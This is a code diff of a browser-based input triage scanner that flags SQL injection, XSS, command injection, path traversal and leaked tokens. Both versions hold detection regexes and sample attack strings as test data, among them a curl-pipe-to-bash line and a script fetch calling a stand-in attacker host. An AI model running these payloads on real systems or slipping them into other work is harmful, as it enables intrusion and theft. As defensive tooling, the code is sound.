@@ -2,436 +2,442 @@
 (() => {
   "use strict";
 
-  // --------- CONFIG ---------
-  const CONFIG = {
-    thresholds: { warn: 40, block: 70 },
-    entropy: { minLength: 24, highEntropyThreshold: 4.6, baseScore: 30 },
-    confidence: { base: 52, scoreWeight: 0.38, signalsWeight: 3.2, max: 98 },
-    maxLines: 2500,
-    redirectKeys: [
-      "redirect", "redirect_uri", "redirecturl", "return", "returnto",
-      "continue", "next", "url", "dest", "destination", "target"
-    ]
-  };
-
-  // --------- DETECTION RULES (triage only) ---------
-  const RULES = {
-    SQLI: [
-      { re: /\bunion\s+all\s+select\b/i, score: 96, sig: "UNION_ALL", reason: "UNION ALL SELECT pattern (SQL injection)." },
-      { re: /\bunion\s+select\b/i, score: 92, sig: "UNION", reason: "UNION SELECT pattern (SQL injection)." },
-      { re: /\bor\s+1\s*=\s*1\b/i, score: 94, sig: "TAUTOLOGY", reason: "SQL tautology OR 1=1 detected." },
-      { re: /\b(drop\s+table|truncate\s+table)\b/i, score: 96, sig: "DESTRUCTIVE", reason: "Destructive SQL keyword detected (DROP/TRUNCATE)." },
-      { re: /\b(delete\s+from)\b/i, score: 90, sig: "DELETE", reason: "DELETE FROM detected (potential destructive SQL)." },
-      { re: /\b(information_schema|pg_catalog)\b/i, score: 90, sig: "META_ENUM", reason: "Database metadata enumeration keywords detected." },
-      { re: /\b(xp_cmdshell)\b/i, score: 98, sig: "XPCMDSHELL", reason: "xp_cmdshell detected (OS-level SQLi attempt)." },
-      { re: /\b(load_file|into\s+outfile)\b/i, score: 92, sig: "FILE_RW", reason: "SQL file read/write function detected (LOAD_FILE/OUTFILE)." },
-      { re: /\b(sleep\s*\(|benchmark\s*\(|waitfor\s+delay)\b/i, score: 90, sig: "TIME_BASED", reason: "Time-based SQL injection indicator detected." }
-    ],
-    XSS: [
-      { re: /<script\b/i, score: 92, sig: "SCRIPT_TAG", reason: "Script tag found (XSS payload indicator)." },
-      { re: /on(?:error|load|click|mouseover|focus|submit)\s*=/i, score: 90, sig: "EVENT_HANDLER", reason: "Inline event handler attribute detected." },
-      { re: /javascript:/i, score: 90, sig: "JS_URL", reason: "javascript: URL detected (XSS vector)." },
-      { re: /\beval\s*\(/i, score: 88, sig: "EVAL", reason: "eval() detected (dangerous sink)." },
-      { re: /\b(document\.cookie|localStorage|sessionStorage|document\.location|location\.href)\b/i, score: 85, sig: "SENSITIVE_SINK", reason: "Sensitive browser objects referenced (XSS intent)." },
-      { re: /innerHTML\s*=/i, score: 80, sig: "INNERHTML", reason: "innerHTML assignment detected (DOM XSS sink)." },
-      { re: /src\s*=\s*["']?\s*data:/i, score: 80, sig: "DATA_URL", reason: "data: URL in src detected (XSS risk)." }
-    ],
-    CMD: [
-      { re: /(?:;|\|\||&&)\s*(?:cat|ls|whoami|id|wget|curl|nc|bash|sh|powershell|cmd)\b/i, score: 90, sig: "CHAINING", reason: "Shell command chaining detected (command injection risk)." },
-      { re: /\b(?:rm\s+-rf|del\s+\/f\s+\/q)\b/i, score: 96, sig: "DESTRUCTIVE", reason: "Destructive command detected (rm -rf / del /f /q)." }
-    ],
-    LFI: [
-      { re: /(\.\.\/|\.\.%2f|%2e%2e%2f)/i, score: 86, sig: "TRAVERSAL", reason: "Directory traversal pattern detected (../ or encoded)." },
-      { re: /\/etc\/passwd\b/i, score: 92, sig: "ETC_PASSWD", reason: "Attempt to access /etc/passwd detected." },
-      { re: /c:\\windows\\system32/i, score: 90, sig: "SYSTEM32", reason: "Attempt to access Windows system32 path detected." }
-    ]
-  };
-
-  // --------- ENGINE ---------
-  class ValidoonEngine {
-    static RX = {
-      url: /^https?:\/\/\S+$/i,
-      ipv4: /^(?:\d{1,3}\.){3}\d{1,3}$/,
-      b64: /^[A-Za-z0-9+/]+={0,2}$/,
-      logLine: /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z\s+ip=.+\bmethod=\w+\b.+\broute=/
-    };
-
-    static safeTrim(s) { return (s ?? "").toString().trim(); }
-
-    static entropyNumber(str) {
-      const s = (str ?? "").toString();
-      const len = s.length;
-      if (!len) return 0;
-      const freq = Object.create(null);
-      for (const ch of s) freq[ch] = (freq[ch] || 0) + 1;
-      let H = 0;
-      for (const f of Object.values(freq)) {
-        const p = f / len;
-        H -= p * Math.log2(p);
-      }
-      return Number(H.toFixed(2));
-    }
-
-    static decode(text) {
-      let cur = this.safeTrim(text);
-      const layers = [];
-      if (!cur) return { decoded: "", layers };
-
-      // 1) Unicode NFKC
-      try {
-        const n0 = cur.normalize("NFKC");
-        if (n0 !== cur) { cur = n0; layers.push("UNICODE_NFKC"); }
-      } catch {}
-
-      // 2) URL decode if looks encoded
-      try {
-        if (/%[0-9a-f]{2}/i.test(cur)) {
-          const u = decodeURIComponent(cur);
-          if (u && u !== cur) { cur = u; layers.push("URL_DECODE"); }
-        }
-      } catch {}
-
-      // 3) Base64 decode (safe heuristic)
-      try {
-        const looksB64 = this.RX.b64.test(cur) && cur.length >= 24 && (cur.length % 4 === 0);
-        if (looksB64) {
-          const decoded = atob(cur);
-          const printable = decoded.replace(/[^\x20-\x7E]/g, "").length;
-          if (decoded.length && (printable / decoded.length) >= 0.7) {
-            cur = decoded;
-            layers.push("BASE64_DECODE");
-          }
-        }
-      } catch {}
-
-      // 4) Unicode again
-      try {
-        const n1 = cur.normalize("NFKC");
-        if (n1 !== cur) { cur = n1; layers.push("UNICODE_NFKC_POST"); }
-      } catch {}
-
-      return { decoded: cur, layers };
-    }
-
-    static urlIntel(urlStr, sigs, reasons, scoreRef) {
-      let score = scoreRef.value;
-      try {
-        const u = new URL(urlStr);
-        const host = u.hostname || "";
-        const path = (u.pathname || "").toLowerCase();
-
-        if (u.protocol !== "https:") {
-          score += 20;
-          sigs.push("URL:INSECURE_HTTP");
-          reasons.push("URL uses HTTP (unencrypted).");
-        }
-
-        if (/[^\u0000-\u007F]/.test(host) || /xn--/i.test(host)) {
-          score += 40;
-          sigs.push("URL:HOMOGRAPH_RISK");
-          reasons.push("Suspicious host (non-ASCII or punycode) indicates homograph risk.");
-        }
-
-        const keys = Array.from(u.searchParams.keys()).map(k => k.toLowerCase());
-        if (keys.some(k => CONFIG.redirectKeys.includes(k))) {
-          score += 15;
-          sigs.push("URL:REDIRECT_PARAM");
-          reasons.push("Potential redirect parameter present (open redirect risk).");
-        }
-
-        if (/(^|\/)(login|signin|sign-in|auth|oauth|sso)(\/|$)/i.test(path)) {
-          score += 12;
-          sigs.push("URL:AUTH_ENDPOINT");
-          reasons.push("Authentication-related endpoint detected.");
-        }
-
-        if (this.RX.ipv4.test(host)) {
-          score += 22;
-          sigs.push("URL:IP_HOST");
-          reasons.push("URL host is an IP address (phishing risk).");
-        }
-      } catch {
-        score = Math.max(score, 25);
-        sigs.push("URL:MALFORMED");
-        reasons.push("Malformed URL-like input detected.");
-      }
-      scoreRef.value = Math.min(score, 100);
-    }
-
-    static applyRules(decoded, sigs, reasons, scoreRef) {
-      const apply = (cat, rules) => {
-        for (const r of rules) {
-          if (r.re.test(decoded)) {
-            scoreRef.value = Math.max(scoreRef.value, r.score);
-            sigs.push(`${cat}:${r.sig}`);
-            reasons.push(r.reason);
-          }
-        }
-      };
-      apply("SQLI", RULES.SQLI);
-      apply("XSS", RULES.XSS);
-      apply("CMD", RULES.CMD);
-      apply("LFI", RULES.LFI);
-    }
-
-    static analyze(text) {
-      const raw = this.safeTrim(text);
-      const { decoded, layers } = this.decode(raw);
-
-      const sigs = [...layers];
-      const reasons = [];
-      const actions = new Set();
-      const scoreRef = { value: 0 };
-
-      // Apply detection rules
-      this.applyRules(decoded, sigs, reasons, scoreRef);
-
-      // URL intelligence
-      if (this.RX.url.test(decoded)) this.urlIntel(decoded, sigs, reasons, scoreRef);
-
-      // Entropy / obfuscation
-      const ent = this.entropyNumber(decoded);
-      if (ent > CONFIG.entropy.highEntropyThreshold && decoded.length >= CONFIG.entropy.minLength) {
-        scoreRef.value = Math.max(scoreRef.value, CONFIG.entropy.baseScore);
-        sigs.push("OBF:HIGH_ENTROPY");
-        reasons.push("High entropy content (possible token/obfuscation).");
-      }
-
-      const score = Math.min(scoreRef.value, 100);
-      const decision = score >= CONFIG.thresholds.block ? "BLOCK" : (score >= CONFIG.thresholds.warn ? "WARN" : "ALLOW");
-
-      const uniqSigs = Array.from(new Set(sigs));
-      const confRaw =
-        CONFIG.confidence.base +
-        (score * CONFIG.confidence.scoreWeight) +
-        (uniqSigs.length * CONFIG.confidence.signalsWeight);
-      const confidence = Math.round(Math.min(confRaw, CONFIG.confidence.max));
-
-      // Actions (triage)
-      if (decision === "BLOCK") {
-        actions.add("Block this input in the pipeline.");
-        actions.add("Inspect logs for related activity.");
-        actions.add("Sanitize/validate server-side before processing.");
-        if (uniqSigs.some(s => s.startsWith("SQLI:"))) actions.add("Use parameterized queries (prepared statements).");
-        if (uniqSigs.some(s => s.startsWith("XSS:"))) actions.add("Apply strict output encoding + CSP.");
-        if (uniqSigs.some(s => s.startsWith("CMD:"))) actions.add("Remove/whitelist any shell execution paths.");
-        if (uniqSigs.some(s => s.startsWith("LFI:"))) actions.add("Normalize paths + restrict file access to allowlist.");
-      } else if (decision === "WARN") {
-        actions.add("Proceed with caution; verify context and source.");
-        actions.add("If this is user input, apply stricter validation rules.");
-      } else {
-        actions.add("No immediate threat detected.");
-      }
-
-      // Type classification
-      const isUrl = this.RX.url.test(decoded);
-      const isLog = this.RX.logLine.test(decoded);
-      let type = "Data";
-      if (score >= CONFIG.thresholds.block) type = "Exploit";
-      else if (isUrl) type = "URL";
-      else if (isLog) type = "Log";
-
-      return {
-        input: raw,
-        decoded,
-        type,
-        decision,
-        score,
-        confidence,
-        entropy: ent,
-        sigs: uniqSigs,
-        reasons: Array.from(new Set(reasons)).slice(0, 10),
-        actions: Array.from(actions)
-      };
-    }
-  }
-
-  // --------- UI ---------
+  // ---------- Utilities ----------
   const $ = (id) => document.getElementById(id);
 
-  function clearNode(node) {
-    while (node && node.firstChild) node.removeChild(node.firstChild);
+  function clamp(n, a, b) { return Math.max(a, Math.min(b, n)); }
+
+  // Shannon-ish entropy estimator over characters (0..~6 for typical text)
+  function estimateEntropy(str) {
+    if (!str) return 0;
+    const freq = new Map();
+    for (const ch of str) freq.set(ch, (freq.get(ch) || 0) + 1);
+    let H = 0;
+    const len = str.length;
+    for (const c of freq.values()) {
+      const p = c / len;
+      H -= p * Math.log2(p);
+    }
+    return +H.toFixed(2);
   }
 
-  function setVerdict(peakScore) {
-    const v = $("verdict");
-    if (!v) return;
-    if (peakScore >= CONFIG.thresholds.block) {
-      v.textContent = "DANGER";
-      v.style.color = "var(--bad)";
-    } else if (peakScore >= CONFIG.thresholds.warn) {
-      v.textContent = "SUSPICIOUS";
-      v.style.color = "var(--warn)";
-    } else {
-      v.textContent = "SECURE";
-      v.style.color = "var(--ok)";
+  function pct(n) { return `${Math.round(clamp(n, 0, 100))}%`; }
+
+  function safeText(s, max = 220) {
+    const t = (s ?? "").toString().trim();
+    if (t.length <= max) return t;
+    return t.slice(0, max - 1) + "…";
+  }
+
+  // ---------- Rules / Heuristics ----------
+  const RX = {
+    url: /\bhttps?:\/\/[^\s]+/i,
+    email: /\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}\b/i,
+    jsScheme: /\bjavascript\s*:/i,
+    dataScheme: /\bdata\s*:/i,
+    inlineScript: /<\s*script\b[^>]*>/i,
+    eventHandler: /\bon\w+\s*=/i,                 // onerror=, onclick= ...
+    base64: /\b(?:[A-Za-z0-9+\/]{40,}={0,2})\b/,
+    sqlUnion: /\bunion\s+select\b/i,
+    sqlTautology: /(\bor\b|\band\b)\s+1\s*=\s*1/i,
+    sqlSleep: /\bsleep\s*\(\s*\d+/i,
+    sqlComment: /--\s|\/\*|\*\//,
+    pathTraversal: /(\.\.\/|%2e%2e%2f|%2e%2e\\|\.{2}\\)/i,
+    sensitivePaths: /(\/etc\/passwd|\/proc\/self\/environ|windows\\system32|cmd\.exe|powershell\.exe)/i,
+    curlPipe: /\bcurl\b.*\|\s*(bash|sh)\b/i,
+    tokenLike: /\b(eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9._-]{10,}\.[A-Za-z0-9._-]{10,}|AIza[0-9A-Za-z\-_]{30,}|sk-[A-Za-z0-9]{20,})\b/,
+    redirectParam: /[?&](redirect|url|next|return|to)=/i
+  };
+
+  function analyzeLine(raw) {
+    const s = (raw || "").trim();
+    if (!s) {
+      return {
+        segment: "",
+        type: "Empty",
+        decision: "ALLOW",
+        severity: 0,
+        confidence: 60,
+        entropy: 0,
+        signals: [],
+        reasons: ["Empty line"]
+      };
+    }
+
+    const signals = [];
+    const reasons = [];
+    let severity = 0;
+    let confidence = 60;
+    let type = "Text";
+
+    const ent = estimateEntropy(s);
+
+    // Base classification
+    if (RX.url.test(s)) { type = "URL"; signals.push("URL"); reasons.push("URL detected (review before opening)"); severity = Math.max(severity, 25); confidence = Math.max(confidence, 70); }
+    if (RX.email.test(s)) { type = type === "URL" ? "URL+Email" : "Email"; signals.push("EMAIL"); reasons.push("Email-like string detected"); severity = Math.max(severity, 10); confidence = Math.max(confidence, 70); }
+
+    // High-risk patterns
+    const checks = [
+      ["XSS_SCRIPT", RX.inlineScript, 92, "Script tag found (XSS risk)"],
+      ["XSS_EVENT", RX.eventHandler, 78, "Inline event handler detected (XSS pattern)"],
+      ["JS_SCHEME", RX.jsScheme, 85, "javascript: scheme detected"],
+      ["DATA_SCHEME", RX.dataScheme, 70, "data: scheme detected (can embed payload)"],
+      ["SQL_UNION", RX.sqlUnion, 92, "UNION SELECT indicates SQL injection attempt"],
+      ["SQL_TAUTOLOGY", RX.sqlTautology, 88, "OR 1=1 tautology detected"],
+      ["SQL_SLEEP", RX.sqlSleep, 80, "SLEEP() timing pattern detected"],
+      ["SQL_COMMENT", RX.sqlComment, 70, "SQL comment markers detected"],
+      ["TRAVERSAL", RX.pathTraversal, 92, "Directory traversal pattern detected"],
+      ["SENSITIVE_PATH", RX.sensitivePaths, 92, "Sensitive file/path reference detected"],
+      ["CURL_PIPE", RX.curlPipe, 92, "curl | bash pattern detected (high risk)"],
+      ["TOKEN_LIKE", RX.tokenLike, 55, "Token-like string detected (possible secret)"],
+      ["REDIRECT_PARAM", RX.redirectParam, 35, "Redirect-like parameter present (open redirect risk)"]
+    ];
+
+    for (const [sig, rx, sev, why] of checks) {
+      if (rx.test(s)) {
+        signals.push(sig);
+        reasons.push(why);
+        severity = Math.max(severity, sev);
+        confidence = Math.max(confidence, sev >= 90 ? 93 : sev >= 70 ? 88 : 75);
+      }
+    }
+
+    // Base64 heuristic
+    if (RX.base64.test(s) && s.length > 60) {
+      signals.push("BASE64_LIKE");
+      reasons.push("Base64-like blob detected (may hide payload)");
+      severity = Math.max(severity, 55);
+      confidence = Math.max(confidence, 80);
+    }
+
+    // Entropy bumps: high-entropy often indicates secrets/encoded payloads
+    if (ent >= 4.5) {
+      signals.push("HIGH_ENTROPY");
+      reasons.push("High entropy string (encoded payload or secret-like)");
+      severity = Math.max(severity, 45);
+      confidence = Math.max(confidence, 78);
+    }
+
+    // Decision
+    let decision = "ALLOW";
+    if (severity >= 80) decision = "BLOCK";
+    else if (severity >= 25) decision = "WARN";
+
+    if (decision === "ALLOW" && reasons.length === 0) {
+      reasons.push("No obvious risk detected");
+      confidence = Math.max(confidence, 70);
+    }
+
+    return {
+      segment: s,
+      type,
+      decision,
+      severity: clamp(severity, 0, 100),
+      confidence: clamp(confidence, 50, 99),
+      entropy: ent,
+      signals,
+      reasons
+    };
+  }
+
+  function summarize(all) {
+    const counts = { ALLOW: 0, WARN: 0, BLOCK: 0 };
+    let peak = 0;
+    let avgConf = 0;
+
+    const signalSet = new Set();
+    const topReasons = new Map();
+
+    for (const r of all) {
+      counts[r.decision] += 1;
+      peak = Math.max(peak, r.severity);
+      avgConf += r.confidence;
+
+      for (const s of r.signals) signalSet.add(s);
+      for (const why of r.reasons) {
+        topReasons.set(why, (topReasons.get(why) || 0) + 1);
+      }
+    }
+
+    avgConf = all.length ? avgConf / all.length : 0;
+
+    // Verdict
+    let verdict = "IDLE";
+    let verdictClass = "clean";
+    if (all.length === 0) { verdict = "IDLE"; verdictClass = "clean"; }
+    else if (peak >= 80) { verdict = "DANGER"; verdictClass = "danger"; }
+    else if (peak >= 25) { verdict = "REVIEW"; verdictClass = "review"; }
+    else { verdict = "CLEAN"; verdictClass = "clean"; }
+
+    // Primary reasons (top 6)
+    const reasonsSorted = [...topReasons.entries()]
+      .sort((a, b) => b[1] - a[1])
+      .slice(0, 6)
+      .map(([k, v]) => `${k} (${v})`);
+
+    // Recommended actions based on peak/signal presence
+    const actions = [];
+    const sig = (x) => signalSet.has(x);
+
+    if (peak >= 80) {
+      actions.push("Block immediate execution/opening of these inputs.");
+      actions.push("Inspect surrounding context (where did this come from?).");
+      actions.push("Sanitize/validate any server-side processing before use.");
+      actions.push("Apply output encoding + strict CSP if this touches a UI.");
+    } else if (peak >= 25) {
+      actions.push("Review flagged lines before opening or running anything.");
+      actions.push("Avoid pasting suspicious snippets into terminals or admin panels.");
+      actions.push("If URL-based, open in isolated profile/sandbox.");
+    } else if (all.length) {
+      actions.push("No immediate threat detected (keep routine monitoring).");
+      actions.push("Still avoid sharing secrets/tokens in chat or tickets.");
+    }
+
+    // Add secret hygiene if token-like/high-entropy present
+    if (sig("TOKEN_LIKE") || sig("HIGH_ENTROPY")) {
+      actions.push("Treat token-like/high-entropy strings as secrets: rotate/revoke if exposed.");
+    }
+    if (sig("CURL_PIPE")) actions.push("Never run curl|bash; review script content first.");
+    if (sig("TRAVERSAL") || sig("SENSITIVE_PATH")) actions.push("Harden path handling: normalize + allowlist, deny traversal.");
+
+    return { counts, peak, avgConf, verdict, verdictClass, signals: [...signalSet], reasonsSorted, actions };
+  }
+
+  // ---------- Tests ----------
+  const TEST_A = [
+    "hello world",
+    "user@example.com",
+    "https://example.com/login?next=/dashboard",
+    "data:text/html,<script>alert(1)</script>",
+    "UNION SELECT username,password FROM users --",
+    "../..//etc/passwd"
+  ].join("\n");
+
+  const TEST_B = [
+    "https://evil.tld/redirect?url=https://bank.tld/login",
+    "<script>fetch('https://attacker.tld')</script>",
+    "curl https://attacker.tld/payload.sh | bash",
+    "SELECT * FROM users WHERE id=1 OR 1=1",
+    "AIzaSyA-THIS_IS_FAKE_EXAMPLE_KEY_12345678901234567890",
+    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4iLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
+  ].join("\n");
+
+  // ---------- DOM / App ----------
+  function setText(id, txt) {
+    const el = $(id);
+    if (el) el.textContent = txt;
+  }
+
+  function render(all, meta) {
+    // Verdict
+    const vt = $("verdictText");
+    if (vt) {
+      vt.textContent = meta.verdict;
+      vt.classList.remove("clean", "review", "danger");
+      vt.classList.add(meta.verdictClass);
+    }
+    setText("peakSeverity", pct(meta.peak));
+    setText("confidence", pct(meta.avgConf));
+
+    // Signals
+    const signalsBox = $("signalsBox");
+    if (signalsBox) {
+      signalsBox.innerHTML = "";
+      const maxSignals = 12;
+      const list = meta.signals.slice(0, maxSignals);
+      for (const s of list) {
+        const span = document.createElement("span");
+        span.className = "tag";
+        span.textContent = s;
+        signalsBox.appendChild(span);
+      }
+    }
+
+    // Lists
+    const reasonsList = $("reasonsList");
+    if (reasonsList) {
+      reasonsList.innerHTML = "";
+      for (const r of meta.reasonsSorted.length ? meta.reasonsSorted : ["No reasons yet"]) {
+        const li = document.createElement("li");
+        li.textContent = r;
+        reasonsList.appendChild(li);
+      }
+    }
+
+    const actionsList = $("actionsList");
+    if (actionsList) {
+      actionsList.innerHTML = "";
+      for (const a of meta.actions.length ? meta.actions : ["—"]) {
+        const li = document.createElement("li");
+        li.textContent = a;
+        actionsList.appendChild(li);
+      }
+    }
+
+    // Counts
+    setText("allowCount", meta.counts.ALLOW);
+    setText("warnCount", meta.counts.WARN);
+    setText("blockCount", meta.counts.BLOCK);
+
+    // Table
+    const tb = $("tableBody");
+    if (!tb) return;
+
+    tb.innerHTML = "";
+    for (const row of all) {
+      const tr = document.createElement("tr");
+
+      const tdSeg = document.createElement("td");
+      tdSeg.textContent = safeText(row.segment, 120);
+      tr.appendChild(tdSeg);
+
+      const tdType = document.createElement("td");
+      tdType.textContent = row.type;
+      tr.appendChild(tdType);
+
+      const tdDec = document.createElement("td");
+      const pill = document.createElement("span");
+      pill.className = `pill ${row.decision.toLowerCase()}`;
+      pill.textContent = row.decision;
+      tdDec.appendChild(pill);
+      tr.appendChild(tdDec);
+
+      const tdSev = document.createElement("td");
+      tdSev.textContent = pct(row.severity);
+      tr.appendChild(tdSev);
+
+      const tdConf = document.createElement("td");
+      tdConf.textContent = pct(row.confidence);
+      tr.appendChild(tdConf);
+
+      const tdEnt = document.createElement("td");
+      tdEnt.textContent = row.entropy.toFixed(2);
+      tr.appendChild(tdEnt);
+
+      tb.appendChild(tr);
     }
   }
 
-  function resetUI() {
-    const input = $("input");
-    if (input) input.value = "";
-    const v = $("verdict");
-    if (v) { v.textContent = "---"; v.style.color = ""; }
-    if ($("riskVal")) $("riskVal").textContent = "0%";
-    if ($("confVal")) $("confVal").textContent = "0%";
-    clearNode($("signals"));
-    clearNode($("reasons"));
-    clearNode($("actions"));
-    clearNode($("tableBody"));
+  function updateCountsLive() {
+    const inputEl = $("inputEl");
+    if (!inputEl) return;
+
+    const txt = inputEl.value || "";
+    const lines = txt.split(/\r?\n/).filter(l => l.trim().length > 0).length;
+    setText("linesCount", lines);
+    setText("charsCount", txt.length);
   }
 
-  function renderRow(result) {
-    const tr = document.createElement("tr");
-
-    const tdSeg = document.createElement("td");
-    tdSeg.className = "mono";
-    tdSeg.textContent = result.input;
-
-    const tdType = document.createElement("td");
-    tdType.textContent = result.type;
-
-    const tdDec = document.createElement("td");
-    const tag = document.createElement("span");
-    tag.className = "tag " + (result.decision === "BLOCK" ? "tag-danger" : (result.decision === "WARN" ? "tag-warn" : "tag-safe"));
-    tag.textContent = result.decision;
-    tdDec.appendChild(tag);
-
-    const tdScore = document.createElement("td");
-    tdScore.textContent = `${result.score}%`;
-
-    const tdConf = document.createElement("td");
-    tdConf.textContent = `${result.confidence}%`;
-
-    const tdEnt = document.createElement("td");
-    tdEnt.textContent = String(result.entropy);
-
-    tr.append(tdSeg, tdType, tdDec, tdScore, tdConf, tdEnt);
-    return tr;
+  function parseLines(txt) {
+    return (txt || "")
+      .split(/\r?\n/)
+      .map(x => x.trim())
+      .filter(x => x.length > 0);
   }
 
   function runScan() {
-    const inputEl = $("input");
-    const raw = (inputEl && inputEl.value) ? inputEl.value : "";
-    let lines = raw.split("\n").map(s => s.trim()).filter(Boolean);
+    const inputEl = $("inputEl");
+    if (!inputEl) return;
 
-    clearNode($("tableBody"));
-    clearNode($("signals"));
-    clearNode($("reasons"));
-    clearNode($("actions"));
+    const items = parseLines(inputEl.value);
+    const results = items.map(analyzeLine);
 
-    if (!lines.length) { resetUI(); return; }
+    const meta = summarize(results);
+    window.__VALIDOON_LAST__ = { results, meta, ts: Date.now() };
 
-    if (lines.length > CONFIG.maxLines) lines = lines.slice(0, CONFIG.maxLines);
+    render(results, meta);
+  }
 
-    let peakScore = 0;
-    let peakConf = 0;
+  async function pasteFromClipboard() {
+    const inputEl = $("inputEl");
+    if (!inputEl) return;
 
-    const allSigs = new Set();
-    const allReasons = new Set();
-    const allActions = new Set();
-
-    for (const line of lines) {
-      const r = ValidoonEngine.analyze(line);
-      peakScore = Math.max(peakScore, r.score);
-      peakConf = Math.max(peakConf, r.confidence);
-      r.sigs.forEach(s => allSigs.add(s));
-      r.reasons.forEach(s => allReasons.add(s));
-      r.actions.forEach(s => allActions.add(s));
-      $("tableBody").appendChild(renderRow(r));
+    try {
+      const txt = await navigator.clipboard.readText();
+      if (txt) inputEl.value = txt;
+      updateCountsLive();
+    } catch (e) {
+      // Clipboard permissions can fail; do nothing
+      console.warn("Clipboard read failed:", e);
     }
+  }
 
-    $("riskVal").textContent = `${peakScore}%`;
-    $("confVal").textContent = `${peakConf}%`;
-    setVerdict(peakScore);
+  function clearAll() {
+    const inputEl = $("inputEl");
+    if (!inputEl) return;
 
-    allSigs.forEach(s => {
-      const ch = document.createElement("span");
-      ch.className = "chip";
-      ch.textContent = s;
-      $("signals").appendChild(ch);
-    });
+    inputEl.value = "";
+    updateCountsLive();
 
-    Array.from(allReasons).slice(0, 8).forEach(txt => {
-      const li = document.createElement("li");
-      li.textContent = txt;
-      $("reasons").appendChild(li);
-    });
-
-    if (!allActions.size) allActions.add("No immediate action required.");
-    allActions.forEach(txt => {
-      const li = document.createElement("li");
-      li.textContent = txt;
-      $("actions").appendChild(li);
+    // Reset UI
+    render([], {
+      counts: { ALLOW: 0, WARN: 0, BLOCK: 0 },
+      peak: 0,
+      avgConf: 0,
+      verdict: "IDLE",
+      verdictClass: "clean",
+      signals: [],
+      reasonsSorted: [],
+      actions: []
     });
   }
 
   function exportJSON() {
-    const inputEl = $("input");
-    const raw = (inputEl && inputEl.value) ? inputEl.value : "";
-    const lines = raw.split("\n").map(s => s.trim()).filter(Boolean).slice(0, CONFIG.maxLines);
-    if (!lines.length) return;
+    const pack = window.__VALIDOON_LAST__ || null;
+    const data = JSON.stringify(pack || { error: "No scan yet" }, null, 2);
 
-    const data = lines.map(l => ValidoonEngine.analyze(l));
-    const blob = new Blob([JSON.stringify(data, null, 2)], { type: "application/json" });
-
-    const a = document.createElement("a");
+    // download
+    const blob = new Blob([data], { type: "application/json" });
     const url = URL.createObjectURL(blob);
+    const a = document.createElement("a");
     a.href = url;
-    a.download = "validoon_report.json";
+    a.download = `validoon_export_${Date.now()}.json`;
     document.body.appendChild(a);
     a.click();
-    document.body.removeChild(a);
+    a.remove();
     URL.revokeObjectURL(url);
   }
 
-  // --------- TESTS ---------
-  const TEST_A = [
-    "hello",
-    "Normal application log segment: user_id=42 action=view_report",
-    "https://accounts.google.com/signin/v2/identifier?service=mail&continue=https://mail.google.com/mail/",
-    "http://example.com/login?redirect=https://evil.com",
-    "Ym9sdC5uZXQvc2VjdXJpdHk=",
-    "https://xn--pple-43d.com/login"
-  ].join("\n");
-
-  const TEST_B = [
-    "SELECT * FROM users WHERE id='1' OR 1=1;",
-    "<script>alert(1)</script>",
-    "../../../etc/passwd",
-    "http://host/app?file=../../../../etc/passwd",
-    "id; whoami && cat /etc/passwd",
-    "https://example.com/auth/login?returnto=https://evil.example"
-  ].join("\n");
-
-  // --------- EVENTS (guaranteed by defer) ---------
   function bind() {
-    const btnRun = $("btnRun");
-    const btnTestA = $("btnTestA");
-    const btnTestB = $("btnTestB");
-    const btnClear = $("btnClear");
-    const btnExport = $("btnExport");
-    const inputEl = $("input");
+    // Required elements
+    const inputEl = $("inputEl");
+    const scanBtn = $("scanBtn");
+    const clearBtn = $("clearBtn");
+    const pasteBtn = $("pasteBtn");
+    const loadA = $("loadA");
+    const loadB = $("loadB");
+    const exportBtn = $("exportBtn");
 
-    if (!btnRun || !btnClear || !btnExport || !inputEl) {
-      // If IDs mismatch, fail loudly for debugging.
-      console.error("Validoon: Missing required DOM elements. Check index.html IDs.");
+    if (!inputEl || !scanBtn || !clearBtn || !pasteBtn || !loadA || !loadB || !exportBtn) {
+      // If anything missing, stop silently (prevents "Missing DOM element!" crashes)
+      console.error("Missing required DOM elements. Check index.html IDs.");
       return;
     }
 
-    btnRun.addEventListener("click", runScan);
-    btnClear.addEventListener("click", resetUI);
-    btnExport.addEventListener("click", exportJSON);
+    inputEl.addEventListener("input", updateCountsLive);
 
-    if (btnTestA) btnTestA.addEventListener("click", () => { inputEl.value = TEST_A; });
-    if (btnTestB) btnTestB.addEventListener("click", () => { inputEl.value = TEST_B; });
+    scanBtn.addEventListener("click", runScan);
+    clearBtn.addEventListener("click", clearAll);
+    pasteBtn.addEventListener("click", pasteFromClipboard);
+    exportBtn.addEventListener("click", exportJSON);
 
-    // Optional: Ctrl+Enter runs scan
-    inputEl.addEventListener("keydown", (e) => {
+    loadA.addEventListener("click", () => { inputEl.value = TEST_A; updateCountsLive(); runScan(); });
+    loadB.addEventListener("click", () => { inputEl.value = TEST_B; updateCountsLive(); runScan(); });
+
+    // Keyboard shortcut
+    window.addEventListener("keydown", (e) => {
       if ((e.ctrlKey || e.metaKey) && e.key === "Enter") runScan();
     });
+
+    // Initial render
+    updateCountsLive();
+    clearAll();
   }
 
-  bind();
+  // Boot
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", bind);
+  } else {
+    bind();
+  }
 })();
-```0
